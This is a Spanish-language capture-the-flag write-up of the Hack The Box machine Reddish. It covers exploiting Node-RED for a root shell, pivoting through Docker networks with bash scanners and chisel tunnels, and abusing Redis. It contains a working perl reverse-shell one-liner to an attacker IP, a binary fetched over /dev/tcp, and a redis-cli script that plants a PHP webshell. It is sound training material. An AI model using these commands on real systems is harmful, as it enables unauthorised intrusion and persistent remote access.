---
layout: post
title:  "Maquina  Retirada Reddish de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada REDDISH
tags: HTB, Pivoting, eCPPT, chisel, socat, rsync, bashscript, redis-cli, Node-Red, Maquinas Retiradas, Writeup
---

# Reddis ~ Pivoting ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.94       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error
```
Probamos a hechar un vistazo a la web y vemos que nos pone lo siguiente:
`Can not GET.`

Procedemos a usar el comando `curl`para hacer una peticion por el `metodo POST`
```bash
# curl -X POST "http://10.10.10.94:1880"                                      
{"id":"889671fb6a1a1ce0a10677b25be4eef8","ip":"::ffff:10.10.14.12","path":"/red/{id}"}
```
Hacemos lo que nos indica: 
Usamos Firefox para de nuevo chequear a donde nos lleva la ruta que nos indican -> `http://10.10.10.94:1880/red/889671fb6a1a1ce0a10677b25be4eef8` 

# Node-RED
Nos abre una session de Node-Red - Que es Node-RED? [https://gruposinelec.com/que-es-node-red-y-para-que-sirve/](url)
```bash
"Node-RED" es una herramienta de "programación visual" que se implementa en dispositivos controladores de hardware. Trabaja mostrando de manera visual las relaciones y funciones de manera que se pueda programar sin escribir. 
Es un "panel de flow al que se pueden incorporar nodos que se comuniquen entre ellos" y puede instalarse en equipos como ordenadores Windows, Linux, o en servidores en la nube.
```
Procedemos a buscar por `INPUT` & `OUTPUT`, y selecionamos respectivamente para los dos, los nodos `TCP`/INPUT & `TCP`/OUTPUT. 
- El siguiente paso seria buscar por la funcion `EXEC` colocandola entre los dos nodos `TCP output & TCP input` 
    Procedemos a conetar los nodos de la siguiente forma `TCP INPUT`~`EXEC`~`TCP OUTPUT` para que justo ahora procedamos a setear los valores en los nodos `TCP INPUT Y OUTPUT`.
    Para `TCP_INPUT`: metemos nuestra `IP`+ `PUERTO` y seleccionamos el valor `TYPE` de la siguiente forma: `CONNECT TO $PORT` & `AT HOST $IP`  
    Para `TCP_OUTPUT`: Seteamos simplemente el valor `TYPE` en `REPLAY TO TCP`
    
# Ganando Acceso al Node-RED
Nos ponemos a la escucha ya directamente con el comando `nc -vlnp 443` preparados para activar el boton de `DEPLOY` en el `NODE-RED` (Boton en la parte superior Derecha)
```bash
# nc -vlnp 443                                                                                                                                                                                                1 ⚙
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 36216
whoami
root
```
Procedemos a enumerar a ver si la maquina tiene perl para lanzarnos una `Reverse_shell` en condiciones ya que vemos que a esta no se le puede hacer un tratamiento de la `tty`
```bash 
[object Object]which perl
/usr/bin/perl
```
Vemos que efectivamente dispone de `perl` asique procedemos a enviarnos otra `Reverse_shell`:
```bash
perl -e 'use Socket;$i="10.10.14.12";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
```
La Recibimos: 
```bash
# nc -nlvp 443         
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 36230
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# script /dev/null -c bash
root@nodered:/node-red# ^Z
zsh: suspended  nc -nlvp 443
                                                    
# stty raw -echo; fg                                                                                                                                                                                    148 ⨯ 1 ⚙
[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm

root@nodered:/node-red# export TERM=xterm
root@nodered:/node-red# export SHELL=bash
root@nodered:/node-red# stty rows 50 columns 212
```

Listamos las `Interfaces de Red Disponibles`
```bash
root@nodered:/node-red# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
7: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
17: eth1@if18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.4/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
root@nodered:/node-red# 
```` 
# Mapeado de RED
1.-Vemos que tenemos dos segmentos de Red:
```bash
Node_RED: 
            Interfaces
    Segmento 1    - 172.18.0.2
    Segmento 2    - 172.19.0.4    
```
Procedemos a montarnos un `Scrip en Bash` para listar los posibles `Host` en los `dos segmentos de red` encontrados.
```bash
#!/bin/bash

hosts=("172.18.0" "172.19.0")

for host in ${hosts[@]}; do
        echo -e "\n[+]Enumerating $hosts.0/24\n"
        for i in $(seq 1 254); do
                timeout 1 bash -c "ping -c 1 $host.$i" &>/dev/null && echo "[*] Host: $host.$i ACTIVE [*]" &
        done; wait
done
```
Ahora que ya lo tenemos construido en nuestra Maquina Kali, tenemos que pasarnolo a la maquina comprometida, y vemos que que la maquina `Node-RED` viene bastante pelada de commandos a poder ejecutar.. asique la mejor forma de proceder es en `codificar` el scrip en `Base64` para posteriormente decodificarlo en la maquina Node-RED` ya que si cuenta con `Base64`.
```bash
- Codificandolo
# base64 -w 0 hostsD.sh
IyEvYmluL2Jhc2gKCmhvc3RzPSgiMTcyLjE4LjAiICIxNzIuMTkuMCIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KCWVjaG8gLWUgIlxuWytdRW51bWVyYXRpbmcgJGhvc3RzLjAvMjRcbiIKCWZvciBpIGluICQoc2VxIDEgMjU0KTsgZG8KCQl0aW1lb3V0IDEgYmFzaCAtYyAicGluZyAtYyAxICRob3N0LiRpIiAmPi9kZXYvbnVsbCAmJiBlY2hvICJbKl0gSG9zdDogJGhvc3QuJGkgQUNUSVZFIFsqXSIgJgoJZG9uZTsgd2FpdApkb25lCg==

- Decodificandolo en la Maquina Victima
root@nodered:/node-red# echo "IyEvYmluL2Jhc2gKCmhvc3RzPSgiMTcyLjE4LjAiICIxNzIuMTkuMCIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KCWVjaG8gLWUgIlxuWytdRW51bWVyYXRpbmcgJGhvc3RzLjAvMjRcbiIKCWZvciBpIGluICQoc2VxIDEgMjU0KTsgZG8KCQl0aW1lb3V0IDEgYmFzaCAtYyAicGluZyAtYyAxICRob3N0LiRpIiAmPi9kZXYvbnVsbCAmJiBlY2hvICJbKl0gSG9zdDogJGhvc3QuJGkgQUNUSVZFIFsqXSIgJgoJZG9uZTsgd2FpdApkb25lCg==" | base64 -d > hostD.sh
```
Lo comprobamos con un `cat` y probamos a ejecutarlo tras darle privilegios con `chmod +x hostD.sh`:
```bash
root@nodered:/node-red# ./hostD.sh 

[+]Enumerating 172.18.0.0/24

[*] Host: 172.18.0.2 ACTIVE [*]
[*] Host: 172.18.0.1 ACTIVE [*]

[+]Enumerating 172.18.0.0/24

[*] Host: 172.19.0.4 ACTIVE [*]
[*] Host: 172.19.0.3 ACTIVE [*]
[*] Host: 172.19.0.2 ACTIVE [*]
[*] Host: 172.19.0.1 ACTIVE [*]
```
 Volvemos al mapeado de Red
 
 # Mapeado de RED 2
 Vemos que tenemos dos segmentos de Red:
```bash
Node_RED: 
            Interfaces
    Segmento 1    - 172.18.0.2
    Segmento 2    - 172.19.0.4    

Siguientes Nuevos Hosts: 
            Interfaces
     Segmento 1   - 172.18.0.1
     Segmento 2   - 172.19.0.1 - 172.19.0.2 - 172.19.0.3
```

Vamos a proceder a modificar nuestro `Script en Bash`
```bash
# cat HostsPortsD.sh 
#!/bin/bash

hosts=("172.18.0.1" "172.19.0.1" "172.19.0.2" "172.19.0.3")

for host in ${hosts[@]}; do
        echo -e "\n[+]Scanning ports in $host\n"
        for port in $(seq 1 10000); do
                timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2> /dev/null && echo -e "\t[*] Puerto: $port - ABIERTO [*]" &
        done; wait
done
```
Hacemos el mismo procedimiento para este script y lo codificamos en base64 igual que antes
```bash
- Coding en base64
# base64 -w 0 HostsPortsD.sh
IyEvYmluL2Jhc2gKCmhvc3RzPSgiMTcyLjE4LjAuMSIgIjE3Mi4xOS4wLjEiICIxNzIuMTkuMC4yIiAiMTcyLjE5LjAuMyIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KICAgICAgICBlY2hvIC1lICJcblsrXVNjYW5uaW5nIHBvcnRzIGluICRob3N0XG4iCiAgICAgICAgZm9yIHBvcnQgaW4gJChzZXEgMSAxMDAwMCk7IGRvCiAgICAgICAgICAgICAgICB0aW1lb3V0IDEgYmFzaCAtYyAiZWNobyAnJyA+IC9kZXYvdGNwLyRob3N0LyRwb3J0IiAyPiAvZGV2L251bGwgJiYgZWNobyAtZSAiXHRbKl0gUHVlcnRvOiAkcG9ydCAtIEFCSUVSVE8gWypdIiAmCiAgICAgICAgZG9uZTsgd2FpdApkb25lCg==

- Decoding en base64
root@nodered:/node-red# echo "IyEvYmluL2Jhc2gKCmhvc3RzPSgiMTcyLjE4LjAuMSIgIjE3Mi4xOS4wLjEiICIxNzIuMTkuMC4yIiAiMTcyLjE5LjAuMyIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KICAgICAgICBlY2hvIC1lICJcblsrXVNjYW5uaW5nIHBvcnRzIGluICRob3N0XG4iCiAgICAgICAgZm9yIHBvcnQgaW4gJChzZXEgMSAxMDAwMCk7IGRvCiAgICAgICAgICAgICAgICB0aW1lb3V0IDEgYmFzaCAtYyAiZWNobyAnJyA+IC9kZXYvdGNwLyRob3N0LyRwb3J0IiAyPiAvZGV2L251bGwgJiYgZWNobyAtZSAiXHRbKl0gUHVlcnRvOiAkcG9ydCAtIEFCSUVSVE8gWypdIiAmCiAgICAgICAgZG9uZTsgd2FpdApkb25lCg==" | base64 -d > hostPortsD.sh
```
Lo Ejecutamos en la maquina Victima `Node-RED`
```bash
root@nodered:/node-red# ./hostPortsD.sh 

[+]Scanning ports in 172.18.0.1             --------------- esta no tiene sentido ya que si es un docker muy probablemte por eso tenga el mismo puerto abierto
        [*] Puerto: 1880 - ABIERTO [*]

[+]Scanning ports in 172.19.0.1             ---------------- nada

[+]Scanning ports in 172.19.0.2             ---------------- puerto 80 abierto   
        [*] Puerto: 80 - ABIERTO [*]

[+]Scanning ports in 172.19.0.3             ---------------- puerto 6379 abierto
        [*] Puerto: 6379 - ABIERTO [*]
```

# Chisel ~ PortForwarding
- Uso de `Chisel` para tunelizar los puertos de esos dos Host en nuestra maquina `kali` como `localhost: 127.0.0.1` 
- Hacemos un `Git Clone` a este repositorio[https://github.com/jpillora/chisel](url)

Como nos compartimos el `Chisel`? 
Procedemos a hacer lo siguiente para compartirnoslo con `NETCAT`

```bash
# nc -nlvp 444 < chisel
listening on [any] 444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 34176

# Comprobacion
# md5sum chisel                                                                                                                                                                 
30746509fdce4adf32a5cd4e30a13327  chisel
```
En la maquina Noder-RED:
```bash
root@nodered:/node-red# cat > chisel < /dev/tcp/10.10.14.12/444
root@nodered:/node-red# md5sum chisel 
30746509fdce4adf32a5cd4e30a13327  chisel
```
El Archivo se a pasado correctamente asique procedemos a darle permisos de Ejecucion para Posteriormente montarme un `reverse server` con `chisel` para tunelizar los puertos que desde la `Maquina Node-RED` si que llegamos a nuestro `Kali Atacante` atraves de la maquina `Node-RED`
- En nuestro Kali - Uso de `chisel`:
```bash
# ./chisel server --reverse -p 1234                                                                                                                                       1 ⚙
2021/06/15 11:02:34 server: Reverse tunnelling enabled
2021/06/15 11:02:34 server: Fingerprint ZTFw97tFy2QFC630TVcPZtloK/mbIKPVzvRsz8Usaxw=
2021/06/15 11:02:34 server: Listening on http://0.0.0.0:1234
2021/06/15 11:06:56 server: session#1: tun: proxy#R:127.0.0.1:80=>172.18.0.1:80: Listening
2021/06/15 11:06:56 server: session#1: tun: proxy#R:127.0.0.1:6379=>172.18.0.1:6379: Listening
``` 
- En la maquina `Node-RED` uso de `chisel`:
```bash
root@nodered:/tmp# ./chisel client 10.10.14.12:1234 R:127.0.0.1:80:172.19.0.2:80 R:127.0.0.1:6379:172.19.0.3:6379
2021/06/15 09:06:54 client: Connecting to ws://10.10.14.12:1234
2021/06/15 09:06:55 client: Connected (Latency 41.53419ms)
```
# Uso de Nmap a nivel local
Ahora que ya tenemos accesibles los puertos con el `Remote PortForwarding` hacemos un scaneo con nmap sobre estos puertos pàra ver la Version y Servicios a nivel de localhost
```bash
# nmap -sC -sV -p80,6379 127.0.0.1                                                                                                                                      130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 11:41 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000026s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Reddish
6379/tcp open  redis   Redis key-value store 4.0.9
```

# Acceso a la siguiente host
- Vemos que el output de nmap nos devuelve un Servicio llamado `Redis` y su Version `4.0.9`
Una vez llegados a este punto procedemos a usar la herramienta `SEARCHSPLOIT` para buscar posibles exploits potenciales para `Redis`
```bash
# searchsploit redis  
--------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------
Redis - Replication Code Execution (Metasploit)                                                                      | linux/remote/48272.rb
Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)                                                        | linux/remote/47195.rb
Redis 5.0 - Denial of Service                                                                                        | linux/dos/44908.txt
Redis-cli < 5.0 - Buffer Overflow (PoC)                                                                              | linux/local/44904.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Vemos que nos sale un recurso que pone que es para Metasploit, asique nanai vamos a probar a buscar a nivel google
`redis remote command execution` [https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](url)

Vale pues procedemos a mirar el puerto 80 del host 172.19.0.2 en nuestro localhost por el puerto 80
Vemos una web que nos pone un FORBBIDEN
Probamos a ver el codigo fuente de la pagina y vemos que nos sale dos rutas potenciales,

```bash
!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
html xmlns="http://www.w3.org/1999/xhtml">
    head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <title>Reddish</title>
        <script src="assets/jquery.js" type="text/javascript"></script>
        <script type="text/javascript">
						$(document).ready(function () {
								incrCounter();
						    getData();
						});

						function getData() {
						    $.ajax({
					        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
						        cache: false,
						        dataType: "text",
						        success: function (data) {
											console.log("Number of hits:", data)
						        },
						        error: function () {
						        }
						    });
						}

						function incrCounter() {
						    $.ajax({
				        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
						        cache: false,
						        dataType: "text",
						        success: function (data) {
				              console.log("HITS incremented:", data);
						        },
						        error: function () {
						        }
						    });
						}
```
Procedemos a buscar la ruta quitando lo de `ajax.php...`

Vamos a usar la `ruta 2` suponiendo que se encuentra a nivel del servidor en la ruta `/var/www/html/8924d0549008565c554f8128cd11fda4`
- Nos creamos un Scrip para `pwn_redis-cli.sh` y subir una webshell en php a la ruta encontrada `siguiendo los pasos de la web` para la Vuln de `RCE de Redis`
```bash
#!/bin/bash

 redis-cli -h 127.0.0.1 flushall
 cat pro4shell.php | redis-cli -h 127.0.0.1 -x set crackit
 redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
 redis-cli -h 127.0.0.1 config set dbfilename "pro4shell.php"
 redis-cli -h 127.0.0.1 save
```` 
